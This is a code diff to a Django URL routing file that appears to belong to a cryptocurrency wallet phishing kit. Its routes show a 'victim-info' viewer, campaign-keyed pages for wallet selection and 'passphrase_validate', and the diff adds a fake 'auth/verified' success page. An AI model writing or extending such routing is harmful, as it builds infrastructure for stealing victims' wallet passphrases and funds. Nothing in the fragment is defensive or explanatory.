@@ -18,5 +18,5 @@ urlpatterns = [
     path('victim-info/', views.victim_info_list, name='victim_info_list'),  # Viewing victim info
     path('auth/<str:campaign_id>/', views.wallet_select, name='wallet_select'),  # Include campaign_id
     path('auth-info/<str:campaign_id>/', views.passphrase_validate, name='passphrase_validate'),  # Include campaign_id
-   
+    path('auth/verified/', views.login_success, name='login_success'),
 ]
